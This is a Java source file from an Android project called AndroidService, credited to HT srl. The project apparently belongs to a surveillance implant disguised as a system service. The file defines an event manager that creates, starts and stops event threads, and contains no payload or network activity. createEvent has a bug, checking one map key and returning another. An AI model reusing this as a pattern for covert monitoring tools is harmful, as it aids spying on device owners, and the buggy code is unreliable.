/* **********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.service.event;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;

import com.android.service.Manager;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

/**
 * The Class EventManager.
 */
public class EventManager extends Manager<EventBase, Integer, Integer> {
	/** The Constant TAG. */
	private static final String TAG = "EventManager"; //$NON-NLS-1$

	/** The singleton. */
	private volatile static EventManager singleton;

	/**
	 * Self.
	 * 
	 * @return the event manager
	 */
	public static EventManager self() {
		if (singleton == null) {
			synchronized (EventManager.class) {
				if (singleton == null) {
					singleton = new EventManager();
					singleton.setFactory(new EventFactory());
				}
			}
		}

		return singleton;
	}

	/**
	 * mapAgent() Add agent id defined by "key" into the running map. If the
	 * agent is already present, the old object is returned.
	 * 
	 * @param key
	 *            : Agent ID
	 * @return the requested agent or null in case of error
	 */
	private EventBase createEvent(final Integer type, final EventConf conf) {

		if (running.containsKey(conf.getId()) == true) {
			return running.get(type);
		}

		final EventBase e = factory.create(type);

		if (e != null) {
			running.put(conf.getId(), e);
		}

		return e;
	}

	/**
	 * Start events.
	 * 
	 * @return true, if successful
	 */
	@Override
	public synchronized boolean startAll() {
		HashMap<Integer, EventConf> events;

		events = status.getEventsMap();

		if (events == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Events map null") ;//$NON-NLS-1$
			}
			return false;
		}

		if (running == null) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Running Events map null") ;//$NON-NLS-1$
			}
			return false;
		}

		final Iterator<Map.Entry<Integer, EventConf>> it = events.entrySet().iterator();

		while (it.hasNext()) {
			final Map.Entry<Integer, EventConf> pairs = it.next();

			final EventConf conf = pairs.getValue();
			final Integer type = conf.getType();
			
			if (Cfg.DEBUG) {
				Check.asserts(pairs.getKey() == conf.getId(), "wrong mapping"); //$NON-NLS-1$
			}

			final EventBase e = createEvent(type, conf);

			if (e != null) {
				e.parse(conf);

				if (!e.isRunning()) {
					final Thread t = new Thread(e);
					
					if (Cfg.DEBUG) {
						t.setName(e.getClass().getSimpleName());
					}
					
					t.start();
					
					if (Cfg.DEBUG) {
						Check.log(TAG + " (startAll): " + e) ;//$NON-NLS-1$
					}
					
					threads.put(e, t);
				} else {
					if (Cfg.DEBUG) {
						Check.log(TAG + " Warn: event already running") ;//$NON-NLS-1$
					}
				}
			}
		}

		return true;
	}

	/**
	 * Stop events.
	 */
	@Override
	public synchronized void stopAll() {
		final Iterator<Map.Entry<Integer, EventBase>> it = running.entrySet().iterator();

		if (Cfg.DEBUG) {
			Check.log( TAG + " (stopAll)") ;//$NON-NLS-1$
		}

		while (it.hasNext()) {
			final Map.Entry<Integer, EventBase> pairs = it.next();
			final EventBase event = pairs.getValue();

			if (Cfg.DEBUG) {
				Check.log(TAG + " Stopping: " + event) ;//$NON-NLS-1$
			}

			try {
				
				if (event.isRunning()) {
					event.stopThread();
					
					try {
						final Thread t = threads.get(event);
						if (Cfg.DEBUG) {
							Check.asserts(t != null, "Null thread"); //$NON-NLS-1$
						}

						if (t != null) {
							t.join();
							threads.remove(event);
						} else {

						}

					} catch (final InterruptedException e) {
						if (Cfg.DEBUG) {
							Check.log(e) ;//$NON-NLS-1$
							Check.log(TAG + " Error: " + e.toString()) ;//$NON-NLS-1$
						}
					}
				} else {
					if (Cfg.DEBUG) {
						Check.asserts(threads.get(event) == null, "Shouldn't find a thread"); //$NON-NLS-1$
					}
				}
			} catch (Exception ex) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (stopAll): " + ex) ;//$NON-NLS-1$
				}
			}

		}

		if (Cfg.DEBUG) {
			Check.ensures(threads.size() == 0, "Non empty threads"); //$NON-NLS-1$
		}
		
		if (Cfg.DEBUG) {
			Check.ensures(running.size() == 0, "Non empty running"); //$NON-NLS-1$
		}

		running.clear();
		threads.clear();
	}

	@Override
	public void start(Integer key) {

	}

	@Override
	public void stop(Integer key) {

	}
}
